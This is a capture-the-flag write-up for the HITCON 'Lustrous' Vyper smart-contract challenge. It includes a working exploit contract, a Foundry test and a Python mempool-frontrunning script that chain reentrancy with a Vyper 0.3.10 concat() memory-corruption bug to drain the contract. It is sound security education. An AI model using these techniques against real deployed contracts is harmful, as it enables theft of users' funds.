# Lustrous [11 solves / 327 points] [Solved after CTF ended]

## Description :
```
"In a world inhabited by crystalline lifeforms called The Lustrous, every unique gem must fight for their way of life against the threat of lunarians who would turn them into decorations." – Land of the Lustrous

nc lustrous.chal.hitconctf.com 31337

lustrous-e8b4ee1f74b5f0f2392436f5def8bc5ede435bbf.tar.gz

Author: minaminao (DeFiHackLabs)
```

This is a tough challenge, I did not solve this during the CTF. During the CTF, I passed the first 2 stages quickly with frontrunning, however I was completely stuck on the last stage until the CTF end.

I was trying really hard to look for all possible bugs in the code, but I cant think of any way to win the last stage. Actually, the bug to win the last stage is a bug in the vyper compiler, and I was in a completely wrong direction.

The goal of this challenge is to completely drain the land_of_the_lustrous.vy contract :

```python
@external
@view
def is_solved() -> bool:
    return self.balance == 0
```

We can register as master and create gem with 1 ether to fight the lunarians, and if we can beat all of them, we will get all ether of the contract :

```python
    if self.gems[gem_id].status == GemStatus.ACTIVE \
        and (lunarian.health <= 0 or lunarian.health < self.gems[gem_id].health):
        if self.stage == 0:
            send(self.master_addr, as_wei_value(1, "ether"))
            self.stage += 1
        elif self.stage == 1:
            send(self.master_addr, as_wei_value(2, "ether"))
            self.stage += 1
        elif self.stage == 2:
            send(self.master_addr, self.balance)
            # congratz :)
```

The last lunarian has a significantly larger health and attack than the first 2 lunarians :

```python
LUNARIANS: constant(Lunarian[STAGES]) = [
    Lunarian({ health: 1_000, attack: 10_000, rounds: 100 }),
    Lunarian({ health: 10_000, attack: 100_000, rounds: 200 }),
    Lunarian({ health: 1 << 64, attack: 1 << 128, rounds: 300 }),
]
```

Initially, we have 1.5 ether, and the contract has 1 million ether, we can create 1 gem.

In order to start a battle, we have to solve the pow to let the deployer of the contract to start the battle, because the battle can only be started by the contract deployer.

It will generate random arguments for the function call to battle(), and basically the battle is about rock paper scissors :

```python
    for r in range(lunarian.rounds, bound=MAX_ROUNDS):
        # rock paper scissors
        lunarian_action: uint8 = lunarian_actions[r]
        gem_action: uint8 = gem_actions[r]
        assert lunarian_action <= 2 and gem_action <= 2, "invalid action"

        if lunarian_action == gem_action:
            continue

        master_win: bool = (lunarian_action == 0 and gem_action == 1) \
            or (lunarian_action == 1 and gem_action == 2) \
            or (lunarian_action == 2 and gem_action == 0)
```

There is a 5 seconds block time in the anvil instance, so its possible to view the battle() transaction in the mempool to see its action, then frontrun it with higher gas price in the same block with the correct answer, so we will always win every round.

I won the first 2 battles quickly, however the last lunarian has way too much health and I could not win the battle within 300 rounds, we can win a battle by either having the lunarian's health below or equal 0 or our gem's health more than lunarian's health while our gem's status is active :

```python
    if self.gems[gem_id].status == GemStatus.ACTIVE \
        and (lunarian.health <= 0 or lunarian.health < self.gems[gem_id].health):
        if self.stage == 0:
            send(self.master_addr, as_wei_value(1, "ether"))
            self.stage += 1
        elif self.stage == 1:
            send(self.master_addr, as_wei_value(2, "ether"))
            self.stage += 1
        elif self.stage == 2:
            send(self.master_addr, self.balance)
            # congratz :)
        return True, lunarian.health, self.gems[gem_id].health
    else:
        self.stage = 0
        return False, lunarian.health, self.gems[gem_id].health
```

If after all the rounds, our gem's haven't been destroyed or the lunarian is still surviving or have more health than our gem's health, we will still lose the battle and the stage will be reset to 0.

Its possible to keep earning ether from the first 2 lunarians by resetting the stage back to 0 when we lose to the last lunarian.

But even we have a lot of ether and can merge the gems to a stronger one, the last lunarian's health is way too much and its not possible to beat it within 300 rounds.

Also we have to solve a pow which takes around 1 min before having the deployer to call battle() and the challenge timeout in 10 min.

I noticed that the health/attack/hardness values are int256, and if I can make a gem with negative value, I can win the battle, because if we win a round, our health will be decreased by lunarian's attack divided by our gem's hardness, if the hardness is negative, we will be gaining health and the last lunarian attack value is so much larger than its health

```python
        if master_win:
            lunarian.health -= self.gems[gem_id].attack
        else:
            self.gems[gem_id].health -= lunarian.attack / self.gems[gem_id].hardness
```

However, I could not find a way to make hardness to negative.

Also, I noticed there's a reentrancy in battle(). 

It will perform an external call to our master contract decide_continue_battle() if our gem is no longer active, and that time our gem's health is decreased, however its status have not been changed, its updating the status of the gem after the external call :

```python
        if self.calc_status(self.gems[gem_id].health) != GemStatus.ACTIVE:
            master.decide_continue_battle(r, lunarian.health)
            if self.continued[self.master_addr]:
                self.continued[self.master_addr] = False
                self.gems[gem_id].health = self.gems[gem_id].max_health 

        self.gems[gem_id].status = self.calc_status(self.gems[gem_id].health)
```

However I could not find a way to win the battle with this.

When I was testing it locally with foundry, I found that the gem status behaves in a weird way.

```python
enum GemStatus:
    ACTIVE
    INACTIVE
    DESTROYED
```

When the status is active, the status has a value of 1 instead of 0, because in solidity the first value in enum should be 0.

But actually in vyper the first value in enum is 1 :

https://github.com/vyperlang/vyper/issues/3285

But again, I could not find a way to win the battle with this.

I was stuck in this challenge for the entire CTF. I barely slept during the CTF and I was very tired and Im almost giving up.

And I started scrolling twitter in the last hour and wait until the CTF end, but then I found this tweet by the author minaminao :

https://twitter.com/vinami/status/1762364721666359789

Which is about a vyper bug in version 0.3.10, which is the excat version the challenge contract is using.

The bug is about overflowing the offset of an array when it is trying to abi decode the data to point the start of an array to anywhere in the memory

https://github.com/vyperlang/vyper/security/advisories/GHSA-9p8r-4xp4-gw5w

a PoC is provided :

```python
event Pwn:
    pass

@external
def f(x: Bytes[32 * 3]):
    a: Bytes[32] = b"foo"
    y: Bytes[32 * 3] = x

    decoded_y1: Bytes[32] = _abi_decode(y, Bytes[32])
    a = b"bar"
    decoded_y2: Bytes[32] = _abi_decode(y, Bytes[32])

    if decoded_y1 != decoded_y2:
        log Pwn()
```

So I just use foundry debugger to test it with the calldata in the PoC :
```
0xd45754f8
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000060
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa0
```

![](https://i.imgur.com/r1LokRr.png)

The calldata is calling the f() function and set the offset of the bytes array argument to a really large value.

The offset is pointing to the memory location where the data of the bytes array start after that location.

We can see that value is copied to the memory in 0x120, so its adding 0x120 to the offset value, which will overflow to 0xc0, and it will read the data in 0xc0 as the data of the array, first 32 bytes is the length and then is the actual content.

However the challenge contract is just abi decoding the actions we returned in get_actions(), and all we can control is the content of the array storing our actions, but our contract is returning that so we have control in that already, and I cant think of a way to win the last battle.

This is pretty much everything I found during the CTF.

---

After the CTF ended, I asked the author minaminao about the challenge. 

Actually, frontrunning is unintended and he did not restrict the api access correctly to prevent frontrunning thats why frontrunning works. And that abi decoding bug in vyper is for drawing the rounds in the battle without frontrunning.

To win the last battle, we need to exploit another vyper bug :

https://github.com/vyperlang/vyper/security/advisories/GHSA-2q8v-3gqq-4f8p

It is a bug that concat() in vyper can corrupt memory that is storing other data.

If concat() is inside an internal function, that is called by an external function. The memory for the internal function is lower than the memory that the external function is using to store its data, and it will overwrite the external function's data.

Just like the abi decoding bug, a PoC is provided for this bug as well.

```python
#@version ^0.3.9

@internal
def bar() -> uint256:
    sss: String[2] = concat("a", "b") 
    return 1


@external
def foo() -> int256:
    a: int256 = -1
    b: uint256 = self.bar()
    return a 
```

So I just tried running the PoC with foundry debugger to gain a better understanding of it.


The external function has a local variable a (int256) which has the value of -1.

The hex value of it is 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, because its using two's complement :

```solidity
➜ int256(-1)
Type: int256
├ Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
├ Hex (full word): 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
└ Decimal: -1
```

![](https://i.imgur.com/bBrkLRI.png)

The value of the local variable `a` is stored in memory 0x140, it is trying to concat() "a" (0x61) with "b" (0x62), because "a" is 1 bytes, so it will mstore the "b" right after that one byte (memory 0x121) to concatenate them.

However mstore will write 32 bytes of memory, and the most significant one byte of the local variable `a` in the external function will be overwritten.

Originally, it has the value of -1, and because its using two's complement the most significant byte is overwritten to 0x00, so it become 452312848583266388373324160190187140051835877600158453279131187530910662655, which is a large positive value

```python
>>> 0x00ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
452312848583266388373324160190187140051835877600158453279131187530910662655
```

In the challenge contract, there is a get_gem_id() internal function that is using concat() :

```python
@internal
@pure
def get_gem_id(master_addr: address, sequence: uint32) -> bytes32:
    master_addr_bytes: bytes20 = convert(master_addr, bytes20)
    sequence_bytes: bytes4 = convert(sequence, bytes4)
    gem_id: bytes32 = keccak256(concat(master_addr_bytes, sequence_bytes))
    return gem_id
```

And it is being called by the external function merge_gems() :

```python
@external
def merge_gems() -> Gem:
    assert self.master_addr == msg.sender, "only master can merge gems"
    assert self.sequences[msg.sender] >= 2, "not enough gems to merge"

    gem1: Gem = self.gems[self.get_gem_id(msg.sender, self.sequences[msg.sender] - 2)]
    gem2: Gem = self.gems[self.get_gem_id(msg.sender, self.sequences[msg.sender] - 1)]

    assert (gem1.status == GemStatus.ACTIVE and gem2.status == GemStatus.INACTIVE) \
        or (gem1.status == GemStatus.INACTIVE and gem2.status == GemStatus.ACTIVE) \
        or (gem1.status == GemStatus.INACTIVE and gem2.status == GemStatus.INACTIVE), "invalid gem status"

    gem: Gem = Gem({
        health: gem1.health + gem2.health,
        max_health: gem1.max_health + gem2.max_health,
        attack: gem1.attack + gem2.attack,
        hardness: (gem1.hardness + gem2.hardness) / 2,
        status: self.calc_status(gem1.health + gem2.health),
    })
    self.gems[self.get_gem_id(msg.sender, self.sequences[msg.sender] - 2)] = gem
    self.sequences[msg.sender] -= 1
    return gem
```

So the right part of `sequence_bytes` will be overwriting data in merge_gems()

By using foundry debugger, we can see that it's overwriting gem1.health

So if we have gem1 with negative health and several bytes in the left side are being overwritten, we can turn the negative health to a large positive health.

With this large amount of health, we can finally beat the last lunarian and win the last battle to drain the contract.

However if a gem's health is negative, it should have the status of destroyed, and we cant merge it.

But using that reentrancy I mentioned above, when it is doing the external call of decide_continue_battle() to our master contract in battle(), our health is being decreased and it can be negative, however during the external call the status of the gem is not updated yet even if it has a negative health.

So we can reenter to merge_gems() when the gem is still active but has a negative health, and because of the concat() bug, several bytes in the left side will be overwritten and because its using two's complement, a negative health will be changed to a large positive health.

So I will test it with foundry debugger, these 2 gems are the gems that Im merging :

```solidity
Gem({ health: -574, max_health: 101, attack: 46, hardness: 148, status: 1 })

Gem({ health: 34, max_health: 101, attack: 46, hardness: 148, status: 2 })
```

And the result is this merged gem :

```solidity
Gem({ health: 79228162514264337593543949796 [7.922e28], max_health: 202, attack: 92, hardness: 148, status: 1 })
```

![](https://i.imgur.com/xkgCNlW.png)

Originally, gem1.health is -574 (0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdc2), it is stored in memory 0x120.

It is concatenating `master_addr_bytes` (bytes20) with `sequence_bytes` (bytes4), `master_addr_bytes` is stored in memory 0x100, so it is doing mstore in memory 0x114 to concatenate it with `sequence_bytes`, and it overwrites the left 20 bytes in gem1.health :

![](https://i.imgur.com/RAR31JG.png)

So it is changed from -574 (0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdc2) to 79228162514264337593543949762 (0x0000000000000000000000000000000000000000fffffffffffffffffffffdc2)

Then it will add gem2.health (34) with it, so the merged gem has the health of 79228162514264337593543949796, and we have enough health to win the last battle to drain the challenge contract.

## Exploit contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "./ILustrous.sol";
import "forge-std/console.sol";

contract lustrousExploit {
    ILustrous public lustrous;
    uint8[] public ans; 
    bool public reenter;

    constructor(ILustrous _lustrous) payable {
        require(msg.value == 1 ether, "msg.value != 1 ether");
        lustrous = _lustrous;
        lustrous.register_master();
        Gem memory gem = lustrous.create_gem{value: 1 ether}();
        require(gem.health - (int256(10000) / gem.hardness) > 0, "gem wont survive one attack from 1st lunarian");
        require(gem.health - (int256(10000) / gem.hardness) < 64, "gem wont become inactive after one attack from 1st lunarian");
    }

    function setAnswer(uint8[] memory _ans) public {
        ans = _ans;
    }

    function get_actions() public view returns (uint8[] memory) {
        return ans;
    }

    function get_gem_id(address master_addr, uint32 sequence) public pure returns (bytes32) {
        bytes20 master_addr_bytes = bytes20(master_addr);
        bytes4 sequence_bytes = bytes4(sequence);
        bytes32 gem_id = keccak256(abi.encodePacked(master_addr_bytes, sequence_bytes));
        return gem_id;
    }

    function decide_continue_battle(uint256 round, int256 lunarian_health) public returns (bool) {
        // check gem
        // lustrous.gems(get_gem_id(address(this), lustrous.sequences(address(this)) - 2));
        // lustrous.gems(get_gem_id(address(this), lustrous.sequences(address(this)) - 1));
        if (reenter) {
            reenter = false;
            lustrous.merge_gems();
        }
    }

    function buy_gem() public {
        lustrous.create_gem{value: 1 ether}();
    }

    function assign_gem(uint32 sequence) public {
        lustrous.assign_gem(sequence);
    }

    function setReenter() public {
        reenter = true;
    }

    fallback() external payable {}
}
```

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "../../lib/utils/VyperDeployer.sol";
import "forge-std/Test.sol";
import "../ILustrous.sol";
import "../Exploit.sol";

contract lustrousTest is Test {
    VyperDeployer vyperDeployer = new VyperDeployer();
    ILustrous lustrous;

    function setUp() public {
        vm.roll(4);

        vm.deal(address(vyperDeployer), 1000000 ether);
        lustrous = ILustrous(vyperDeployer.deployContract("land_of_the_lustrous"));
    }

    function testRun() public {
        console.log("stage :", lustrous.stage());
 
        lustrousExploit exploit = new lustrousExploit{value: 1 ether}(lustrous);

        uint8[] memory action = new uint8[](100);
        for (uint i; i < action.length; i++) {
            action[i] = uint8(uint256(keccak256(abi.encodePacked(i))) % 3);
        }

        // frontrun to set correct answer
        uint8[] memory ans = new uint8[](100);
        for (uint i; i < ans.length; i++) {
            ans[i] = (action[i] + 1) % 3;
        }
        exploit.setAnswer(ans);

        vm.prank(address(vyperDeployer));
        lustrous.battle(action);


        action = new uint8[](200);
        for (uint i; i < action.length; i++) {
            action[i] = uint8(uint256(keccak256(abi.encodePacked(i))) % 3);
        }

        ans = new uint8[](200);
        for (uint i; i < ans.length; i++) {
            ans[i] = action[i];
        }
        // draw to reset stage back to 0 without losing health
        exploit.setAnswer(ans);

        vm.prank(address(vyperDeployer));
        lustrous.battle(action);


        // buy a new gem with the earned 1 ether in the first battle
        exploit.buy_gem();
        
        // assign the 2nd gem
        exploit.assign_gem(1);

        action = new uint8[](100);
        for (uint i; i < action.length; i++) {
            action[i] = uint8(uint256(keccak256(abi.encodePacked(i))) % 3);
        }

        ans = new uint8[](100);
        for (uint i; i < ans.length; i++) {
            ans[i] = (action[i] + 2) % 3;
        }
        // intentionally lose in the first attack so 2nd gem become inactive
        exploit.setAnswer(ans);

        vm.prank(address(vyperDeployer));
        lustrous.battle(action);



        // assign the 1st gem that is active
        exploit.assign_gem(0);

        action = new uint8[](100);
        for (uint i; i < action.length; i++) {
            action[i] = uint8(uint256(keccak256(abi.encodePacked(i))) % 3);
        }

        ans = new uint8[](100);
        for (uint i; i < ans.length; i++) {
            ans[i] = (action[i] + 1) % 3;
        }
        // frontrun to win once
        exploit.setAnswer(ans);

        vm.prank(address(vyperDeployer));
        lustrous.battle(action);



        action = new uint8[](200);
        for (uint i; i < action.length; i++) {
            action[i] = uint8(uint256(keccak256(abi.encodePacked(i))) % 3);
        }

        ans = new uint8[](200);
        for (uint i; i < ans.length; i++) {
            ans[i] = (action[i] + 2) % 3;
        }
        // intentionally lose, so health become negative, then reenter to merge_gem and exploit the concat bug to get huge amount of health
        exploit.setAnswer(ans);
        exploit.setReenter();

        vm.prank(address(vyperDeployer));
        lustrous.battle(action);



        action = new uint8[](300);
        for (uint i; i < action.length; i++) {
            action[i] = uint8(uint256(keccak256(abi.encodePacked(i))) % 3);
        }

        ans = new uint8[](300);
        for (uint i; i < ans.length; i++) {
            ans[i] = (action[i] + 1) % 3;
        }
        // even we cant kill the 3rd lunarian, our health is larger than it so we still win
        exploit.setAnswer(ans);

        vm.prank(address(vyperDeployer));
        lustrous.battle(action);

        console.log("stage :", lustrous.stage());
        console.log("isSolved:", lustrous.is_solved());
    }
}
```

```
Ran 1 test for src/test/Lustrous.t.sol:lustrousTest
[PASS] testRun() (gas: 4237525)
Logs:
  stage : 0
  stage : 2
  isSolved: true

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.29s (43.35ms CPU time)

Ran 1 test suite in 4.29s (4.29s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

---

So we can just exploit the remote instance and get flag

I wrote a python script to monitor the mempool and frontrun transactions calling battle() to get our ideal result (win/lose/draw) :

```python
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware
from threading import Thread
from eth_account import Account
import sys

if len(sys.argv) != 2:
	print("wrong argument")
	exit()


arg = sys.argv[1]
if arg == "win":
	choice = 1
elif arg == "lose":
	choice = 2
elif arg == "draw":
	choice = 0


# uuid = '3990522a-216d-4f04-aaf5-97cd3f7542fb'
# web3 = Web3(HTTPProvider(f'http://localhost:8545/{uuid}'))
uuid = 'a62ad90c-16a3-4dd5-bb57-8cd018bdb98a'
web3 = Web3(HTTPProvider(f'http://lustrous.chal.hitconctf.com:8545/{uuid}'))

web3.middleware_onion.inject(geth_poa_middleware, layer=0) 

pending_filter = web3.eth.filter('pending')

done = False


exploitAddress = '0x095F62FaE3CEc65e31324b0713232A983Cc1cE24'
exploitAbi = [{"inputs":[{"internalType":"contract ILustrous","name":"_lustrous","type":"address"}],"stateMutability":"payable","type":"constructor"},{"inputs":[],"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","name":"ans","outputs":[{"internalType":"uint8","name":"","type":"uint8"}]},{"inputs":[{"internalType":"uint32","name":"sequence","type":"uint32"}],"stateMutability":"nonpayable","type":"function","name":"assign_gem"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"buy_gem"},{"inputs":[{"internalType":"uint256","name":"round","type":"uint256"},{"internalType":"int256","name":"lunarian_health","type":"int256"}],"stateMutability":"nonpayable","type":"function","name":"decide_continue_battle","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"get_actions","outputs":[{"internalType":"uint8[]","name":"","type":"uint8[]"}]},{"inputs":[{"internalType":"address","name":"master_addr","type":"address"},{"internalType":"uint32","name":"sequence","type":"uint32"}],"stateMutability":"pure","type":"function","name":"get_gem_id","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"lustrous","outputs":[{"internalType":"contract ILustrous","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"reenter","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[{"internalType":"uint8[]","name":"_ans","type":"uint8[]"}],"stateMutability":"nonpayable","type":"function","name":"setAnswer"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"setReenter"}]
exploit_instance = web3.eth.contract(address=exploitAddress, abi=exploitAbi)

lustrousAddress = '0x9ae5b5E723B4b52f2733a29FC4f6341DbB66c7e2'
lustrousAbi = [{"inputs":[{"internalType":"uint32","name":"sequence","type":"uint32"}],"stateMutability":"nonpayable","type":"function","name":"assign_gem"},{"inputs":[{"internalType":"address","name":"arg0","type":"address"}],"stateMutability":"view","type":"function","name":"assigned_gems","outputs":[{"internalType":"uint32","name":"","type":"uint32"}]},{"inputs":[{"internalType":"uint8[]","name":"lunarian_actions","type":"uint8[]"}],"stateMutability":"nonpayable","type":"function","name":"battle","outputs":[{"internalType":"bool","name":"","type":"bool"},{"internalType":"int256","name":"","type":"int256"},{"internalType":"int256","name":"","type":"int256"}]},{"inputs":[],"stateMutability":"payable","type":"function","name":"continue_battle"},{"inputs":[{"internalType":"address","name":"arg0","type":"address"}],"stateMutability":"view","type":"function","name":"continued","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"payable","type":"function","name":"create_gem","outputs":[{"internalType":"struct Gem","name":"","type":"tuple","components":[{"internalType":"int256","name":"health","type":"int256"},{"internalType":"int256","name":"max_health","type":"int256"},{"internalType":"int256","name":"attack","type":"int256"},{"internalType":"int256","name":"hardness","type":"int256"},{"internalType":"enum GemStatus","name":"status","type":"uint8"}]}]},{"inputs":[{"internalType":"bytes32","name":"arg0","type":"bytes32"}],"stateMutability":"view","type":"function","name":"gems","outputs":[{"internalType":"struct Gem","name":"","type":"tuple","components":[{"internalType":"int256","name":"health","type":"int256"},{"internalType":"int256","name":"max_health","type":"int256"},{"internalType":"int256","name":"attack","type":"int256"},{"internalType":"int256","name":"hardness","type":"int256"},{"internalType":"enum GemStatus","name":"status","type":"uint8"}]}]},{"inputs":[],"stateMutability":"view","type":"function","name":"is_solved","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"lunarian_addr","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"master_addr","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"merge_gems","outputs":[{"internalType":"struct Gem","name":"","type":"tuple","components":[{"internalType":"int256","name":"health","type":"int256"},{"internalType":"int256","name":"max_health","type":"int256"},{"internalType":"int256","name":"attack","type":"int256"},{"internalType":"int256","name":"hardness","type":"int256"},{"internalType":"enum GemStatus","name":"status","type":"uint8"}]}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"pray_gem"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"register_master"},{"inputs":[{"internalType":"address","name":"arg0","type":"address"}],"stateMutability":"view","type":"function","name":"sequences","outputs":[{"internalType":"uint32","name":"","type":"uint32"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"stage","outputs":[{"internalType":"uint8","name":"","type":"uint8"}]},{"inputs":[{"internalType":"address","name":"new_master_addr","type":"address"}],"stateMutability":"nonpayable","type":"function","name":"transfer_master"}]
lustrous_instance = web3.eth.contract(address=lustrousAddress, abi=lustrousAbi)


private_key = '0x6afac93b259f9dfd8892bf31f9808475a9e9c9444d977eaa62018fb4ff128678'
wallet = Account.from_key(private_key).address

nonce = web3.eth.get_transaction_count(wallet)
gasPrice = web3.eth.gas_price
gasLimit = 3000000

tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}

def frontrun(ans):
	global done
	if (not done):
		transaction = exploit_instance.functions.setAnswer(ans).build_transaction(tx)
		signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
		tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
		transaction_hash = web3.to_hex(tx_hash)
		print(f'frontrun with : {transaction_hash}')
		done = True

def get_txn(txn_hash):
	global done
	txn = web3.eth.get_transaction(txn_hash)
	print('Found tx:', txn['hash'].hex())
	try:
		sig, arg = lustrous_instance.decode_function_input(txn['input'])
	except ValueError:
		return
	if (sig.abi['name'] != 'battle'):
		return
	arr = arg['lunarian_actions']
	print(arr)
	ans = []
	for i in arr:
		ans.append((i + choice) % 3)
	print("ans :", ans)
	frontrun(ans)

while True:
	txns = pending_filter.get_new_entries()
	for txn_hash in txns:
		thread = Thread(target=get_txn, args=[txn_hash])
		thread.start()
	if done :
		break
```

At first, we will keep deploy the exploit contract until it doesnt revert and get an ideal gem that will become inactive but not destroyed after one attack from the 1st lunarian.

Then frontrun the battle and win it to earn 1 ether, and frontrun another battle get a draw to reset the stage back to 0.

Then we can create a new gem with the 1 ether we earned and assign that new gem for battle.

Then frontrun the battle and lose it, so it become inactive, and can be used for merge_gems()

Then assign the 1st gem, and frontrun the battle and win it so we enter the next stage to ensure our gem will have a negative health in the next battle. 

Then just call our exploit to set it to reenter to merge_gems(). Then frontrun the battle to lose it so we get negative health, and our contract will reenter to exploit the concat() bug to gain a huge amount of health in our gem, and even we lose every round, we will still win the battle because of our huge amount of health.

Finally, just frontrun the last battle and win it, and even we cant kill the last lunarian, our health is larger than its health so we still win the battle, and the challenge contract will be drained.


## Flag

```
# nc lustrous.chal.hitconctf.com 31337
1 - launch new instance
2 - kill instance
3 - send battle tx (with uniformly random arg)
4 - get flag (if is_solved() is true)
action? 4
uuid please: a62ad90c-16a3-4dd5-bb57-8cd018bdb98a

Congratulations! You have solved it! Here's the flag: 
hitcon{f1y_m3_t0_th3_m00n_3a080ea144010d74}
```
